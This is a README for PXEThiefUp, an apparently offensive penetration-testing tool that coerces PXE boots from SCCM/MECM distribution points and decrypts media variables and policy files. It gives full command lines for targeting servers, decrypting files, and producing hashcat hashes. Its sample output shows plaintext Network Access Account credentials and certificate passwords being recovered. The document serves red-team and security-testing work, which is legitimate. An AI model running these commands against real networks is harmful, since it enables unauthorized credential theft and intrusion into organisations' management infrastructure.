# PXEThiefUp

PXEThiefUp up is a modification of the original [PXEThief by MWR-Cybersec](https://github.com/MWR-CyberSec/PXEThief), (with improvements from the [fork by blurbdust]((https://github.com/blurbdust/PXEThief))). This adds a large amount of features which I needed in the field, and fixes common issues I've found during testing, alongside a lot of refactoring.

## Features

- Automatic and Manual targeting of PXE with Interface Selection
- Offline and Online Media formats supported
    - `variables.dat` and `policy.xml` support
    - `.iso` file support
    - `boot.var` support
- Folder Scanning
- Loot folder organisation for completed files
- Basic weak password testing
- Arg flags
- Both Windows and Linux support

## Installation

### Without a Virtual Enviroment

```bash
git clone github.com/evildaemond/pxethiefup
cd pxethiefup
pip install -r requirements.txt # --break-system-packages may be needed if you are using a newer distro
```

### With Virtual Enviroment

```bash
git clone github.com/evildaemond/pxethiefup
cd pxethiefup
virtualenv env
source env/bin/activate
pip install -r requirements.txt
```

## Usage

```text
usage: pxethiefup [-h] [-a] [-m] [-t [TARGET]] [-u [URL]] [-d] [-f [FOLDER]] [-vf [VARIABLES]] [-pf [POLICY]] [-p [PASSWORD]] [-c] [-v] [-l] [-i INTERFACE]

An upgraded version of PXEThief used for extracting sensitive data from SCCM/MECM material and servers

options:
  -h, --help            show this help message and exit
  -a, --auto            Automatically identify and download encrypted media file using DHCP PXE boot request
  -m, --manual          Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address
  -t [TARGET], --target [TARGET]
                        Target IP address of the MECM Distribution Point server
  -u [URL], --url [URL]
                        Manually specify the URL of the MECM Distribution Point server (useful for when you don't have DNS)
  -d, --decrypt         Decrypt a media variables file and/or policies.xml
  -f [FOLDER], --folder [FOLDER]
                        Folder containing files for decryption
  -vf [VARIABLES], --variables [VARIABLES]
                        Variable file to decrypt
  -pf [POLICY], --policy [POLICY]
                        Policy file to decrypt
  -p [PASSWORD], --password [PASSWORD]
                        Password to decrypt the media variables file (for hex input, use 0x prefix)
  -c, --crack           Print the hash corresponding to a specified media variables file for cracking in hashcat
  -v, --verbose         Enable verbose output
  -l, --list-interfaces
                        List available network interfaces
  -i INTERFACE, --interface INTERFACE
                        Specify the network interface to use (int)
```

### PXE Boot

**Broadcast for DHCP and use PXE to try to download the PXE Materials**
```bash
python3 pxethiefup.py -a
python3 pxethiefup.py --auto
```

**Request a target MECM Distribution Point server for PXE Materials**
```bash
python3 pxethiefup.py -m -t 10.1.1.2
python3 pxethiefup.py --manual -target 10.1.1.2
```

**Use a specific network interface (scapy int value) when requesting the PXE files from a manual interface**
```bash
python3 pxethiefup.py -m -i 73
python3 pxethiefup.py --auto --interface 73
```


### Decryption

**Search a folder for files and decrypt them (including ISO) and decrypt it:**
```bash
python pxethiefup.py  -d -f '../standalone/'
python pxethiefup.py --decrypt --folder '../standalone/'
```

**Decrypt a partial or network based media - Variables file with no password or unknown password:**
```bash
python3 pxethiefup.py -d -vf variables.xml
python3 pxethiefup.py --decrypt --variables variables.xml
```

**Decrypt a partial or network based media - Variables file using a password:**
```bash
python3 pxethiefup.py -d -vf variables.xml -p password123
python3 pxethiefup.py --decrypt --variables variables.xml --password password123
```

**Decrypt the full media using a variables and policy file:**
```bash
python3 pxethiefup.py -d -vf variables.xml -pf policies.xml -p password123
python3 pxethiefup.py --decrypt --variables variables.xml --policy policies.xml --password password123
```

**Decrypt a boot.var file with the known password**
```bash
python pxethiefup.py  -d -f '../boot.var/'  -p 0xc8ff83ffabff76006a004e006e007d00f8ff3900
python pxethiefup.py  --decrypt --folder '../boot.var/'  -p 0xc8ff83ffabff76006a004e006e007d00f8ff3900
```

### Utils

**Display the hash corresponding to a media variables file for cracking in hashcat:**
```bash
python3 pxethiefup.py -c -vf variables.xml
python3 pxethiefup.py --crack --variables variables.xml
```

**Display current network interfaces**
```bash
python3 pxethiefup.py -l
python3 pxethiefup.py --list-interfaces
```


### Examples

**Standalone Media folder containing Policy.xml and Variables.dat**

```text
python pxethiefup.py  -d -f '../standalone/'
[?] Scanning folder for media variables file
[+] Successfully decrypted media variables file with default password
[+] Successfully decrypted media variables file!
[?] Writing decrypted 'TaskSequence_policy_Build - Laptops-BA73FD24-90CB-4BDA-9C71-9C9E1FF761B7.xml'
[?] Writing decrypted 'TaskSequence_policy_Build - Laptops-BA73FD24-90CB-4BDA-9C71-9C9E1FF761B7.xml'
         NAA Credentials
┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
┃   Username    ┃   Password    ┃
┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩
│ domain\__sccm │ password12345 │
│ domain\__sccm │ password12345 │
└───────────────┴───────────────┘
```

**Boot.var with hex password from PXE**

```text
python pxethiefup.py  -d -f '../boot.var/'  -p 0xd0fe83ffbaff67005a4e00005e00d7008fff3900
[?] Scanning folder for media variables file
[+] Successfully decrypted media variables file!
[?] Writing _SMSTSMediaPFX to ER1_dff99bc1-1cb8-47cc-9558-88740b13aa1e_SMSTSMediaPFX.pfx
[?] Certificate password is dff99bc1-1cb8-47cc-9558-88740b13aa1e
[!] SCCM.domain.com does not appear to be a valid hostname or address (or DNS does not resolve)
[?] Please check your DNS settings or use the target flag to set the Management Point URL.
```



## Original References for Code

- [PXEThief by MWR-Cybersec](https://github.com/MWR-CyberSec/PXEThief)
- [PXEThief by blurbdust](https://github.com/blurbdust/PXEThief)
